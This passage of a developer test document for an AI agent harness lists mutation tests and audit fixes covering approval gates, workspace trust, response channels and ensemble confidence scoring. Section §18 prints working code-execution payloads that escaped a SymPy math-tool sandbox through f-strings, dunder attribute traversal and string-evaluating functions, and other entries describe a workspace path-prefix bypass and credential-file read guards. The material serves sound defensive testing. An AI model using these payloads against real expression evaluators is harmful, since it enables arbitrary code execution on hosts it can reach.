| Resolve `read_project_doc`'s path without `realpath` first | `test_read_follows_symlinks_before_deciding` | A link that looks contained and resolves outside is exactly the case the ordering exists for |
| Widen `read_project_doc` to any text file | `TestTheScopedTools` | A permission-`True` tool is advertised to EVERY run, not only `/init`'s. Widening it turns it into `read` with no approval gate, reachable from a research pass |
| Raise `INIT_READ_CHARS` to `MAX_READ_CHARS` | `test_read_caps_below_the_general_read_tool` | TECHNICAL_DEBT item 9: each read is re-billed on every later step |
| Drop `max_total_tokens=INIT_TOKEN_BUDGET` | `test_the_run_gets_its_own_budget_not_the_chat_one` | §26's reasoning — the chat budget cuts a tool-heavy run off early |
| Drop `thread_kind` from the initializer run | `test_the_run_is_labelled_as_a_subagent_thread` | §27: the initializer is a SIXTH thread source |
| Give the initializer a write tool | `test_the_agent_can_only_read` | I8. The agent drafts; the shell writes, because only the shell can show a human a diff |
| Let `confirm=None` proceed | `test_no_confirm_route_writes_nothing` | §25's V6, sixth instance |
| Stop passing the existing `CONTEXT.md` to the agent | `test_an_existing_context_is_given_to_the_agent_to_revise` | I4. Hand edits survive by design, not by the user re-applying them after rejecting a diff |
| Overwrite documents that already exist | `test_an_existing_document_is_left_exactly_as_it_was` | I12. Only `CONTEXT.md` is a file `/init` claims to author |
| Make `render_index` depend on what is on disk | `test_a_second_run_changes_nothing` | I11, and the defect that found it: the second run rewrote `CONTEXT.md` and called files `/init` had just written "pre-existing" |
| Re-grant trust unconditionally | `test_an_untrusted_project_is_not_laundered` | I6. A cloned repo's `.venastine/` must not become trusted as a side effect of an unrelated command |
| Capture `is_trusted()` after the write | `TestWorkspaceTrust` | The hash has already moved, so a trusted project reads as untrusted and is never re-granted |
| Exclude `CONTEXT.md` from the D17 hash | `test_context_md_still_counts_towards_the_hash` | Same hole as the above, with a smaller mouth |
| Drop `_is_secret` from `manifest._tree` | `test_the_manifest_hides_credential_files` | NOTE: the identical call in `_root_documents` is currently UNREACHABLE — nothing is both "interesting" and secret — so mutating that one proves nothing. `_tree` is the load-bearing call |
| Return the raw answer from `ask_project_kind_blocking` | `test_an_unrecognised_kind_answer_cancels` | NOTE: asserting "nothing was written" passes either way, because `generate()` refuses a non-kind downstream. The test asserts the outcome that differs — a clean cancellation rather than an error quoting a value the user never chose |

### Standing: a broken `/init` modal presents as a HUNG suite, not a red one

Two mutations here — `ConfirmScreen.action_decline` dismissing with no value, and
skipping the project-kind modal so the confirmation opens unexpectedly — leave the
`/init` worker parked on `queue.get()`. That also blocks `run_test()`'s teardown, so
pytest stops rather than failing. It is the "every dismissal path carries a value"
invariant doing its job (§16 AC2's original lesson, now in its sixth place), but if the
suite hangs in `test_project_init.py`, look for a modal path that dismisses with
nothing before looking for an infinite loop.

## §15 — the response channel (ROADMAP_v2 §23 slice 1, `test_interaction.py`)

| Change | Breaks | Why |
|---|---|---|
| Make `decode` return the raw value | `TestReview`, `TestChoice` | The whole module exists so one function decides what a non-answer means |
| Make `ask(None, request)` permissive | `TestEveryRouteDeclines` | §25's V6: the inability to ask is not permission to proceed |
| Narrow `ask`'s `except Exception` | `TestEveryRouteDeclines` | A shell that raises must decline, not propagate into the loop |
| Give a kind a permissive default | `test_every_default_declines` | The asymmetry IS the design |
| Return a default for an unknown kind | `test_an_unknown_kind_raises_rather_than_defaulting` | An undefined question is a bug; inventing "no" hides the typo |
| Accept a bare `"accept"` string for review | `TestReview`, `test_the_modal_answer_decoder_fails_safe` | The one kind whose permissive failure APPLIES an edit. The two decoders this replaced disagreed here |
| Test sign-off emptiness with `if raw:` | `TestSubagentSignoff` | Folds "spawn with nothing granted" into "refuse the spawn" — the middle of three answers |
| Drop the candidates intersection | `test_a_name_that_was_not_offered_is_not_granted` | A shell must not grant a tool nobody offered. Only possible because `decode` takes the request |
| Drop the options check on a choice | `TestChoice` | Same, and it is the guard §24 shipped by hand and untested |
| Pass the kind to `decode` instead of the request | everything above | Two kinds become unverifiable |

### §23's migration, in the files it touched

| Change | Breaks | Why |
|---|---|---|
| Bypass `interaction.ask` in `_obtain_approval` | `test_streaming_loop.py`, `test_attended.py` | One route is the point |
| `headless = False` | `TestHeadlessIsAboutBeingUNABLEToAsk` | "No way to ask" is one condition again |
| Ignore `honour_run_scope` | `TestRunScope` | §25 R11: attended mode must re-ask |
| Drop the bundle's channel from `_authorization_kwargs` | `test_review.py`, `test_research_authorization.py` | §20's reviewer inherits the run's channel |
| `a or kwargs.pop(...)` for the channel merge | `test_passing_both_does_not_raise` | Short-circuits, so the key survives on the path where an explicit channel was passed — "got multiple values for keyword argument" |
| Remove `walk_consent`'s `consent is None` branch | `test_findings_are_recorded_but_nothing_is_applied` | NOTE: V6's OUTCOME now holds without it, because `ask(None, …)` declines. What the guard uniquely provides is the audit trail — a `reason_declined` and a trace line, rather than a rejection indistinguishable from a human's |
| Drop `request_kind="subagent_signoff"` from the registration | `TestTheSignoffIsActuallyWired` | NOTE: the memo test PATCHES `request_kind`, so it cannot see this |
| Empty `request_payload`'s candidate list | `TestTheSignoffIsActuallyWired` | Same — patched away by the memo test |
| Drop `signoff` from dispatch's injection map | `test_dispatch_injects_the_subset_into_the_handler` | Every other sign-off test calls `subagent_tool.run()` directly |
| Grant `candidate_approvals` wholesale again | `test_spawn_forwards_the_channel_and_the_grant` | The pre-§23 behaviour AC1b exists to end |
| Treat a `None` sign-off as approval | `test_refusing_a_spawn_stops_it_happening` | Refusing the spawn and spawning with nothing granted are different outcomes |
| Key the sign-off memo by tool name only | `test_s1_signoff_is_remembered_per_agent_not_per_tool_name` | J8: one prompt about agent `a` must not cover agent `b` |
| `SubagentSignoffScreen`'s escape dismissing `set()` | `TestTheSignoffScreen` | Escape refuses; it does not run with nothing granted |

## §23 slice 2 — the question tool and the todo list

`tests/test_question_tool.py`, `tests/test_todo.py`, and the `TestQuestion`
class in `tests/test_interaction.py`.

| Change | Symptom | Fix |
|---|---|---|
| Return the answered options without intersecting them against `payload["options"]` | `TestQuestion::test_an_unoffered_option_is_dropped`, `test_nothing_offered_means_no_options_come_back` | J3's rule, third instance. A shell returning something nobody proposed is answering a different question. The options live on the request precisely so `decode` can check them |
| Decode a `defer` answer as `None`, or drop the `defer` key from the decoded dict | `TestQuestion::test_defer_is_a_real_answer` / `test_defer_ignores_anything_alongside_it`, plus `test_question_tool.py`'s deferral and CLI tests | A deferral is a REAL answer — the user engaged and chose to discuss. A dismissal is not. Collapsing them makes the modal's "Discuss instead" button pointless, and it is `SUBAGENT_SIGNOFF`'s middle-answer trap one kind along |
| Let `ask_user` proceed when `response_channel is None` | `TestHeadlessDeniesAndSaysWhy` (3 tests) | AC2. With nobody to ask, the call is denied and the error tells the model to decide and state its assumption. §25's V6 one section along: the inability to ask is not permission to proceed |
| Gate `ask_user` (`ToolApprovals.ask_user = True`) | `test_the_tool_is_still_ADVERTISED_with_no_channel`, `test_it_is_ungated_and_allowed` | J12. §13 does not merely deny a gated tool where nothing can ask — it stops ADVERTISING it, so a gated `ask_user` is invisible rather than deniable and the model cannot "work around" anything |
| Truncate `options` to `MAX_OPTIONS` instead of refusing | `TestTheOptionCap::test_five_options_are_REFUSED_not_truncated`, `test_the_cap_error_names_the_limit_and_the_count` | Truncating shows the user a different question from the one the model asked, and the model then reads the answer as a response to the whole list. M15's rule with the model in the naming role |
| Drop the `QUESTION` branch from `main.py`'s `ask` or `tui/app.py`'s `_ask_blocking` | `TestTheCliRenderer` (8 tests) / `TestTheTuiModal` (5 tests) | D12. A kind a shell does not render falls through to `None` and decodes as "nobody answered" on every run in that shell, while looking wired up |
| Have `todo_write` write `memory.extra["todos"] = …` instead of `memory.set_extra(...)` | `test_it_persists_through_set_extra_not_by_mutating_extra` | `extra` is a COPY (`core/memory.py`), so mutating it changes nothing and reports success. The symptom is invisible until the next turn |
| Truncate an over-cap todo list, or coerce an unknown status to `pending` | `test_over_the_cap_is_REFUSED_not_truncated`, `test_an_unknown_status_is_REFUSED_not_coerced` | Both leave the model believing it recorded something it did not. `MAX_INJECTED_REFS`' refuse-rather-than-drop rule |
| Stop `_run()` yielding a tool result's `notice` as a `LoopEvent` | `TestTheLoopForwardsAndStripsIt::test_a_notice_on_a_tool_result_becomes_a_loop_event` | AC4's event route (J10). Note the PANEL tests still pass — they post the message directly — so this mutation is caught by the loop test alone, which is why both exist |
| Leave the `notice` in the result instead of popping it | `test_the_notice_is_STRIPPED_from_what_the_model_sees`, `test_a_malformed_notice_is_dropped_not_raised` | A notice is plumbing for the shell. Leaving it in sends the panel's trigger to the model as part of the tool's answer |
| Recognise `todo_write` by name in `core/loop.py` instead of forwarding any result `notice` | Nothing goes red — and that is the point of the generic route | `ToolSpec.grant_scope` and `request_kind` exist so no tool name appears in the loop. `TestTheLoopForwardsAndStripsIt` drives a fake `probe` tool precisely so the mechanism is tested without the tool that motivated it |
| Move `with_todos` inside `with_catalogs()`, or add the fragment to `pass_prompt()` | `TestThePromptTier::test_it_is_NOT_inside_with_catalogs` | §19's K6, FOURTH instance after §21b's M13 and §21c's M19. A checklist written in a chat session would land in all ten passes of a separate research run. The test asserts against three REAL pass prompts, so a leak added one call deeper still fails |
| Remove `ask_user` or `todo_write` from either `config` dataclass | `RuntimeError` at import of `tools.registry`, naming the tool | D24. Verified by deleting `ToolPermissions.todo_write` |
| Make `tui.todo_position` fall back on an unknown value instead of raising | `TestTodoPosition::test_an_unknown_position_raises_and_names_the_vocabulary` | `research.approval_mode`'s precedent, not `tui.theme`'s: the vocabulary lives in `config_loader`, and a position the renderer does not understand puts the panel somewhere the user did not ask for. `tui.effort` had neither check and that was a shipped bug |
| Drop `TodoPanel.__init__`'s `self.display = False` | `TestThePanelWidget::test_it_starts_hidden` | A Textual `reactive`'s watch method does not fire for its initial value, so the panel is a visible empty box until something first sets `todos` — which on a fresh thread may be never |
| Set `display = True` once (ResearchProgress's shape) instead of toggling it | `test_clearing_HIDES_IT_AGAIN` | A todo list empties as well as fills, so the reveal has to be reversible |
| Write a transcript line for a `todo_changed` notice | `test_a_todo_notice_writes_NO_transcript_line` | The list changes several times in a turn; in an append-only transcript that is a column of near-identical lines. §26 made the same call for `pass_activity`. The neighbouring test asserts other notice kinds STILL write theirs, which §21a's "no silent compaction, ever" depends on |

---

## §10 revisit — the ensemble redesign (`test_ensemble_guard.py`, `test_orchestrator.py`, `test_confidence_scoring.py`)

`test_ensemble_guard.py` was rewritten wholesale (3 → 15 tests). It used to guard
§16's refusal of ensemble mode on a model that rejects sampling parameters;
diversity now comes from a roster of different models, so no sampling parameter
is involved and no model is excluded. **The reason the guard exists carried over
even though the mechanism did not** — refusing beats running degraded, because a
degraded ensemble run does not fail, it reports false confidence expensively.

Two constants were **deleted**: `config.ENSEMBLE_TEMPERATURE` (the defect) and
`config.ENSEMBLE_N` (N is `len(config.ENSEMBLE_MODELS)` now). The
`settings.json` key `ensemble_n` and the `ensemble_n` pipeline parameter both
**survive** — removing the key would make every existing `settings.json` that
sets it raise, since unknown keys raise by design.

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| Count roster entries instead of **distinct** `(provider, model)` pairs | `test_one_distinct_model_repeated_is_refused` | The distinctness is the guard. `[X, X, X]` recreates §10's original defect through the new config: no sampling variation remains to make the candidates differ, so they arrive near-identical and every claim scores maximal consistency |
| Add `ensemble_models` to `_KNOWN_SETTINGS` (or drop the named rejection) | `TestSettingsRejectsARoster::test_ensemble_models_is_rejected_by_name` | R12's rule, second instance. The mode is a bool that can only spend more of the provider the user already chose; a **roster chooses providers**, and a project's `settings.json` beats the user's. Rejected by name so the omission does not read as an oversight to fix |
| Run every Pass 1 candidate on the run's own `model`/`provider_name` | `test_each_candidate_runs_on_its_own_provider_and_model`, plus two others | That *is* the mechanism. Note the plain `call_log` cannot catch this — it records only pass ids, so three runs of one model look identical to a three-model ensemble. Use `_routing_mock`, which records `(pass_id, provider_name, model)` |
| Let a candidate's exception propagate instead of skipping | `test_a_failed_candidate_is_named_traced_and_skipped` and three others | §20's containment rule. One unreachable provider must not flip a ten-pass run to `failed` |
| Drop the cause from the skip trace line | Same test, on the `"connection refused"` assertion | "A candidate failed" with no cause is not something a user can act on |
| Label candidates by roster position rather than survivor order | `test_candidate_labels_follow_survivors_not_roster_positions` | A gap ("Candidate 1, Candidate 3") makes Pass 2 tag a claim both survivors asserted as `[1, 3]` against a denominator of 2, so unanimous claims read as dissented-against. Silently deflated confidence is the failure class this section removes |
| Score a single survivor as an ensemble of one (`effective_n >= 1`) | `test_one_surviving_candidate_scores_without_a_penalty` | One candidate cannot disagree with itself, so every claim would score consistency 1.0 and report unanimous corroboration from a single source. `ensemble_n=0` is the **correct** formula there, not a degraded one |
| Honour a passed `ensemble_n` over `len(ENSEMBLE_MODELS)` | `test_ensemble_n_is_ignored_in_favour_of_the_roster` | A confidence score's denominator must not be able to disagree with the roster that produced the candidates |
| Make the disagreement penalty `W * consistency` instead of `W * (1 - consistency)` | `test_ensemble_factual_uses_ensemble_formula`, `test_ensemble_dissent_subtracts_and_grounding_is_not_diluted` | Unanimity must be free. A claim is not penalised for having been generated by an ensemble |
| Restore `0.4/0.3` weighting for ensemble runs | The two above plus `test_partial_grounding_factual_lands_medium` and `test_non_ensemble_regression_identical_output` | Grounding is the pipeline's strongest evidence; which generation strategy produced a claim is no reason to weigh its verification differently |
| Subtract the disagreement penalty in the **non-factual** arm | `test_ensemble_non_factual_ignores_consistency` | E9. **This mutation ran GREEN before that test was fixed**: it asserted with `asserted_by_candidates=[1,2,3]` against `ensemble_n=3`, so the penalty it excluded was zero for that input. It now sweeps 3/3, 1/3 and 0/3 — assert the premise, or the conclusion means nothing |
| Compare the unrounded score against `TIER_THRESHOLDS` (i.e. revert E10) | `test_a_recorded_score_on_a_threshold_gets_that_threshold_s_tier` and `test_the_tier_reads_the_same_number_the_breakdown_stores`, the latter reporting the original symptom verbatim | Round once, use it for both. Note the swept test also covers ensemble inputs, so it catches this regardless of which formula produced the score |
| Delete `_sampling_kwargs`, `MODELS_REJECTING_SAMPLING_PARAMS` or `temperature`'s threading as dead code | Nothing fails immediately — which is the hazard | They are a **backstop** now: nothing in the harness passes a temperature, and the WARNING is how the next caller that wants sampling variation learns it cannot have it. Silence here is exactly how §10's defect stayed invisible |

### Standing: the doc-count guard fires on every added test

`test_docs_consistency.py::test_the_documented_count_is_the_real_one` compares
the collected total against the number quoted in `README.md`, `AGENTS.md` and
`ARCHITECTURE.md`. It **skips** on a narrowed invocation, so a green
`pytest tests/test_ensemble_guard.py` says nothing about it. Run the full suite
before committing, and update all three quotes together.

---

## §16 — the first fix batch from Audit Pass 1 (2026-08-15)

Nine audit findings, all closed by adding tests rather than changing production code. Every
row below was a mutation that left **all 1406 tests green** before this batch; each is now
pinned by the named test. If you are reverting one of these tests, the mutation in its row is
what stops being caught.

**These tests were each driven against their own mutation before landing.** That is the
standard the batch was held to, and two of them failed it on the first attempt — see the two
"standing" notes at the end, which are the more useful half of this section.

### New files

| File | Tests | What it pins |
|---|---|---|
| `test_fake_storage_mirror.py` | 16 | `FakeStorage._reconstruct` / `_split_at` against `storage._to_neutral` / `storage._split_at` (#123) |
| `test_prompt_tier_boundary.py` | 11 | K6 as a rule: a pass prompt is invariant under every session tier (#146) |
| `test_sdk_conformance.py` | 4 | the real pinned SDKs, offline — google-genai fields, the thinking_budget pin note, httpx's redirect default, and #35 as a strict xfail (#143) |
| `test_fetch_url.py` | 18 | `fetch_url`'s whole surface, which no test had ever executed (#120, #58) |

### What breaks them

| Change | Symptom | Why the guard exists |
|---|---|---|
| Change `storage._to_neutral`'s reconstruction without changing `FakeStorage._reconstruct` identically (or vice versa) | `test_fake_storage_mirror.py::TestReconstructionMirrorsProduction` fails, naming the role that diverged | AGENTS.md's "verify against production, not the test double" was a convention nothing checked. Both are pure functions, so the check is direct |
| Make `_split_at` return `len(rows)` for a watermark it cannot find, on **either** side | `test_an_unknown_watermark_is_zero_on_both_sides` | The 0 is what shows the whole thread rather than hiding a prefix on the strength of an id that could not be resolved |
| `return Claim(**raw)` in `_claim_from_json` | 8 tests in `test_orchestrator.py`, including the end-to-end path — the canned Pass 2 payload carries a `confidence` key for exactly this | Nothing outside the allowlist appeared in any canned payload, so the filter was never exercised |
| Widen or narrow `_CLAIM_INPUT_FIELDS` | `test_every_allowlisted_field_still_arrives`'s exact-contents assertion | The previous worked example (`asserted_by_candidates`) was moved INTO the allowlist by §10's revisit, so two documents described filtering with a field that was no longer filtered |
| Remove `dirs.sort()` from `_content_hash` | `test_descent_order_does_not_change_the_digest` | An unchanged `.venastine/` hashing differently re-prompts for trust already granted, and repeated unexplained trust prompts are what train someone to approve without reading |
| Remove `dirs.sort()` from `content_files` | `test_descent_order_does_not_change_the_trust_prompt_listing` + `test_content_files_sorted_and_relative` | Same one-line guard at the site that produces the text a user reads to decide whether to trust a project |
| Append any tier inside `prompts.system_prompts.with_catalogs()` | `test_no_tier_canary_reaches_any_pass_prompt[<tier>]` names the tier; `test_with_catalogs_itself_carries_no_session_tier` names the function | K6/M13/M19/J11 each pinned ONE tier. Appending the project's `CONTEXT.md` inside reached all ten research passes with 1406 green |
| Replace `list_threads`' SQL `WHERE` with a Python filter | `test_list_threads_filters_by_kind_in_sql` — it now reads the statements the driver executes, not the set returned | The returned set is identical either way, so the test was named for a mechanism it could not observe |
| Delete `self._cancel_manager()` from `connect_all`'s except block | `test_connect_timeout_cancels_the_manager_task` — via `_done`, which the except block does not touch | `_task is None` and `clients == {}` are set by the other two statements; they record the release, they do not cause it |
| Remove `fetch_url`'s scheme check or its `is_domain_blocked` call | 7 and 1 tests in `test_fetch_url.py`, each asserting the request never left the process | Both are live and ungated: advertised in plain chat and in all ten research passes |
| Drop the `+ os.sep` from `_is_within_workspace` | `TestSiblingDirectoryPrefix` | `/workspace-evil` is judged inside `/workspace`, turning a PROMPT into an auto-approval. Dormant behind the global deny, which is why it needs a test |
| Narrow `_is_readable_doc`'s `.env` prefix test to `==`, or its any-segment check to `parts[0]` | `test_read_refuses_env_files_with_a_suffix` / `test_read_refuses_a_denied_segment_at_any_depth` | The pre-existing tests used `.env` exactly and put `.venastine` first, so both narrowings kept them green |
| Fix #35 or #53 | The strict `xfail` for each turns into `[XPASS(strict)] … FAILED` | Deliberate. A strict xfail tells whoever fixes the bug to delete the marker, instead of leaving a green xpass nobody reads |

### Standing: a test that fails for the wrong reason is indistinguishable from one that works

Two of this batch's tests passed their first driving for reasons unrelated to what they were
named for. Both were found only by asking *why* the result looked right.

- **`test_sdk_conformance.py`'s #35 arm** reported `xfail` because real `anthropic` does
  `from httpx import URL, Proxy, Timeout, …` at import time, and `real_package("anthropic")`
  left the fake `httpx` in place — so it died with `ImportError` before reaching
  `ModelCapabilities`. **Reaching a real package past a fake means unfaking its dependencies
  too.** Fixed by `real_package("anthropic", "httpx")`.
- **`test_workspace_trust.py`'s first descent-order test** compared a "reversed" walk against
  the real one — and this filesystem enumerates `.venastine/` as `skills, agents`, which is
  already reverse-alphabetical. Two identical orders, compared. **When a test's input is
  "whatever the environment happens to do", control BOTH sides.** Both walks are now
  synthetic, and `test_the_two_walk_doubles_really_do_differ` asserts they differ.

The general form, which `test_pilot_wait.py` already carries for the pilot helpers: when a
test's whole job is to fail on a specific defect, the defect has to be applied and the failure
read — and the *reason* for the failure checked, not just its presence.

### Standing: "collect problems, assert none" passes loudest when it sees nothing

`test_sdk_conformance.py` has two checks of that shape, and both now assert they can see their
subject first — the AST walk found ≥6 classes and ≥10 keywords; `ThinkingConfig` exposes some
`model_fields` at all. An empty collection satisfies "no problems" and an absent field
satisfies `not in`, so either would have gone quietly vacuous at exactly the moment the thing
it inspects stopped being readable.

### Standing: the fake `httpx` now carries state

It gained `_queued` and `_requests` for #120, driven through `tests/conftest.py`'s `http`
fixture, which clears both before and after every test. Reaching into `httpx._queued` directly
from a test leaks a queued response into the next one. The default answer with an empty queue
is unchanged (`_Response(text="", url=url)`), so every pre-existing caller is unaffected.

---

## §17 — the second fix batch from Audit Pass 1 (2026-08-15)

The first batch added tests only. **This one changes production code** — three files, closing
two S0s and two S1s. Every fix was driven against its own mutation before being called done;
the mutation driver is recorded per row below.

| Change | Issues | Files |
|---|---|---|
| Persist the tool-result row before emitting its event | #42 | `core/loop.py` |
| Drop empty assistant turns above the provider branch split | #13, #36 | `core/client.py` |
| Treat a symlinked project tier root as absent | #18 | `core/config_loader.py` |

Suite 1468 → **1488**.

### What breaks these

| If production code changes like this… | …this fails | Why it matters |
|---|---|---|
| Move `memory.add_tool_result()` back after the `yield` | `test_an_abandoned_generator_still_persisted_the_tool_result` + `test_the_assistant_tool_use_was_persisted_too` | D20 already wrote the `tool_use`; the orphaned pair is an unresumable thread, and the failure surfaces on a later resume as a provider error naming none of this |
| Move `tool_call_start` after its dispatch | `test_the_tool_call_start_event_still_precedes_the_dispatch` | The *correct* ordering, pinned so #42's fix is not over-applied. There is nothing to persist at that point |
| Delete the `_is_empty_assistant_turn` pre-filter | 6 tests, including `test_messages_google_empty_assistant_turn_skipped`, which predates the fix | Google's local guard is gone, so the pre-existing test now holds the shared rule — that is the point of moving it |
| Key `_is_empty_assistant_turn` on empty text alone | 6 tests, including the pre-existing `test_messages_openai_assistant_with_null_text` and two Google tool-result tests | A tool-call-only turn has no text. Dropping it takes the `tool_use` with it and orphans the `tool_result` — #42's defect, reached from the translation side |
| Re-add a local empty-turn guard to any one branch | Nothing, and that is the hazard | Two rules that can disagree is the state #13/#36 were filed from. `test_no_provider_emits_a_message_for_an_empty_assistant_turn` is parametrised over all three so a fourth branch inherits the property |
| Drop `os.path.islink` from `_tier_dirs`' project entry | 3 tests in `test_config_loader.py` + `test_the_loader_reads_no_file_the_trust_listing_omits` | Project content loads unhashed, unlisted, and mutable after one grant — and the payload is system-prompt instructions |
| Apply that symlink check to the harness or user tier too | `test_a_symlinked_user_tier_root_still_loads` | Nothing hashes those directories, so it is not a trust question; symlinking `~/.config/venastine/` into a dotfiles repo is legitimate |
| Make `os.walk` follow links in `workspace_trust` | `test_a_symlinked_tier_root_is_invisible_to_both_the_hash_and_the_listing` | Not a regression — a prompt. That test pins the *current* asymmetry, so following links becomes a deliberate change made with the cycle and realpath guards it needs, and #18's loader guard can then be reconsidered |

### Standing: an invariant of the form `A ⊆ B` decays into a tautology

`test_the_loader_reads_no_file_the_trust_listing_omits` asserts `read <= listed`, which is
trivially true when `read` is empty — so it would pass loudest if `_md_files` stopped finding
anything at all. `test_that_invariant_can_actually_fail` is the mutation run as a test: it
rebuilds the pre-#18 unguarded path, asserts it finds something, and asserts that something
escapes the listing. Delete it and the invariant above still passes forever.

This is the same failure mode as the previous batch's "collect problems, assert none", and the
third shape of it recorded here. Subset, emptiness and non-membership assertions are all
satisfied by an absent subject.

### Standing: the producer-side fix is what closes the class

#13 was filed against the OpenAI branch and was live — it killed a real Pass 2. Applying its
suggested fix exactly as written would have left **the default provider** dying differently
(#36), and Google correct only by accident of which provider was under debug when the hazard
was first met. One filter above the split fixed all three and pre-fixes the fourth. That is
AGENTS.md's *fix at the producer, not the consumer* rule meeting a case where the consumers
were three provider branches rather than two call sites.

---

## §18 — #52, the S0 in the math tools (2026-08-15)

`safe_parse`'s stated guarantee — "`__builtins__` blanked, injection-tested" — was false in both
halves, and arbitrary code executed through the real `registry.dispatch` on six tools that are
advertised and ungated in every research pass. Replaced with an **allowlist at the token
boundary**: `_reject_unsafe_names`, first in `_TRANSFORMATIONS`.

Suite 1488 → **1576**. The single injection test became 26 payloads, a 37-case legitimacy
battery, and four closure tests.

### The token filter was wrong, and the bypass is the point

The first version of this fix rejected dunder and non-allowlisted NAME **tokens**. It was
bypassed within the hour of shipping:

```
f"{sympify('__import__(chr(111)+chr(115)).getpid()')}"   ->  the pid, and base64 imported
"{0.__class__.__bases__}".format(pi)                     ->  dunder attributes
sin(pi).func.mro()                                       ->  classes, no underscore anywhere
```

On Python 3.11 an f-string is a **single `STRING` token** (PEP 701 split it into `FSTRING_*`
tokens only in 3.12), so a NAME filter cannot see inside one — while the code within evaluates
with `_SAFE_GLOBALS` in scope, `sympify` included. **A token stream is not the language**, and
which constructs the tokenizer hides is a property of the Python version, not of this code.

The guard is now `_validate_ast`: `parse_expr` split into `stringify_expr` → *check* →
`eval_expr`, validating the AST of exactly the string that will be evaluated against a closed
allowlist of 39 node types out of Python's 118.

### What breaks it

| If production code changes like this… | …this fails | Why it matters |
|---|---|---|
| Add `ast.Attribute` to `_ALLOWED_NODES` | `test_the_dangerous_node_types_are_refused[Attribute]` + 6 payloads | Attribute traversal IS mechanism 2, and is also how `str.format`, `.mro()` and every bound-method route is reached |
| Add `ast.JoinedStr` / `FormattedValue` | same test, + 4 payloads | The bypass that killed the token filter |
| Add `Lambda`, a comprehension, `Starred`, `Dict`, `Set`, `NamedExpr` | same test, parametrised per node | Each is a construct that would have to be argued harmless instead of refused |
| Widen `_ALLOWED_NODES` generally | `test_the_node_allowlist_is_closed_and_small` | Closure is the property. Coverage is not |
| Allowlist any evaluating name | `test_no_permitted_name_can_evaluate_a_string` | Mechanism 1 |
| Allowlist a module name | `test_no_module_object_is_permitted` | It caught `evalf`, which is a **module** in `_SAFE_GLOBALS`, not the method — allowlisted by mistake |
| Go back to `parse_expr()` | 30+ payloads | The check only exists because the two halves are called separately |
| Narrow `_ALLOWED_NAMES` to nothing | 34 legitimacy tests | **Every attack test still passes.** The legitimacy battery is the only thing that sees this |

That last row is why the legitimacy battery exists, and it is #47's lesson applied: an allowlist
needs a test asserting that real producers satisfy it.

### Mechanism 4: a string literal reaching a function that sympifies it

Found by **auditing the allowlist's own source** for calls to `eval`/`exec`/`sympify`, not by
guessing at payloads. Seven permitted names do it — `factor`, `cancel`, `together`, `apart`,
`roots`, `degree`, `nsolve` — and a string literal handed to any of them re-enters the parser
with SymPy's default globals, real builtins included:

```
factor(" __import__(chr(111)+chr(115)).getpid() ")   ->  the pid
```

The leading space is the whole trick: the guard's dunder tripwire matched *prefix and suffix*,
so one space walked past it. Prefix-matching a payload is the same category of mistake as
`chr(111)+chr(115)` defeating a search for the literal `"os"`.

`stringify_expr` gives a string argument to exactly two calls — `Symbol('x')` and
`Float('1.5')` — so `_STRING_ARG_CONSTRUCTORS` licenses those two positions and every other
string literal is refused. **This closes the class without knowing which functions sympify**,
which is the difference between a closure and a filter. Adding a name to
`_STRING_ARG_CONSTRUCTORS` means arguing that the constructor does not sympify what it is
handed.

### Standing: assert the GUARD refused, not that something raised

An earlier version of the battery asserted `pytest.raises(MathParseError)`. Under a
guard-runs-last mutation **all 68 tests stayed green** — `external.gmpy.os` dies with an
`AttributeError` anyway, `split_symbols` having already shredded `external` into
`e*x*t*e*r*n*a*l`. The payload was refused; the guard was not what refused it. The battery now
asserts the guard's own message.

Third time this session that the "fails for the wrong reason" rule has caught something, and the
first time it caught something in a test written *after* the rule was recorded.

### The output backstop, and why it is a deny rather than an allowlist

`_reject_escaped_value` is the only check on what `safe_parse` RETURNS. It refuses a module, a
plain function or method, or a class from outside SymPy, recursing through returned containers
(`solve` returns a list, `roots` a dict, so an escaped object can arrive nested).

It is deliberately a **deny of the escape signature**, not an allowlist of return types: its job
is to catch an escape nobody anticipated, and an allowlist can only catch escapes whose shape was
already imagined — which four of this issue's five mechanisms were not.

| If production code changes like this… | …this fails |
|---|---|
| Drop the `_reject_escaped_value(result)` call | `test_the_backstop_is_actually_wired_into_safe_parse` |
| Let modules through | `test_the_backstop_refuses_a_module` |
| Let any class through | `test_the_backstop_refuses_a_non_sympy_class` |
| Stop recursing into containers | `test_the_backstop_looks_inside_containers` |
| Widen `_STRING_ARG_CONSTRUCTORS` | 11 payload tests |
| Drop the string rule | 10 payload tests |

`test_the_backstop_allows_every_legitimate_return_shape` is the discriminator: a backstop that
refuses everything passes all four of the negative tests above.

### 117 of 213: the allowlist is not "just maths"

The source audit that found mechanism 4 could read **15** of the 229 resolvable allowlisted
names; the other 214 are C extensions. The blackbox probe covers all of them, and the answer is
**117 evaluate a string handed to them** — not 7.

That number is the argument for the string rule being load-bearing rather than defence in depth.
`Symbol` and `Float`, the two licensed positions, are not among the 117, and
`test_the_licensed_string_constructors_do_not_evaluate_their_argument` is the obligation the
licensing decision rests on. `test_the_probe_can_detect_an_evaluator` guards it, because that
test asserts a negative and would pass perfectly if the probe stopped working.

### Not claimed

The battery covers the two filed mechanisms and 14 payloads, and the allowlist fails closed. It
is **not** a proof that no escape exists: the 231 permitted callables were not individually
audited for evaluation behaviour. #57 (no wall-clock bound on math tools) is untouched and
remains open — a token filter bounds what can be *named*, not how long it runs.

---

## §19 — the third fix batch from Audit Pass 1 (2026-08-17)

The S0 tier is clear, so this batch takes the two **S1**s that were ready to build: both carried
a fix already applied as a mutation and verified green, and neither needed a design decision
first. The three remaining S1s do — #57 (parameter bounds vs a watchdog at `dispatch`), #76 (a
shape-validation layer across eight passes), #100 (a control that could not be made green,
because the chat tests supply their lines by patching `builtins.input`).

| Change | Issue | Files |
|---|---|---|
| Count the retry ROUND, not the revision; scope the in-loop re-tiering to the batch | #74 | `core/reasoning/orchestrator.py`, `core/reasoning/confidence_scoring.py` |
| Make the pinned span whole — a pinned `tool_use` brings back the row that answers it | #88 | `storage.py`, `tests/conftest.py` |

Suite 1576 → **1605**. (The intervening count was 1597; three documents quote it, and
`test_docs_consistency` is what makes that mechanical.)

### #74 — the loop's only bound was data the model supplies

`retry_count` was incremented only inside the loop over Pass 6a's response, so a flagged claim
6a did not **name** could never reach D2's cap — and `while flagged:` had no other bound. 6a is
one batched call across every flagged claim, which is exactly the shape a model drops an item
from, and an omission, an empty list and an unknown id are indistinguishable at that lookup:
the claim resolves to `None` and the `if claim:` skips in silence.

Counting the round makes the cap bound the loop by construction. Because `flagged` only ever
shrinks, every claim still in it exhausts on the same round — which is also what makes the
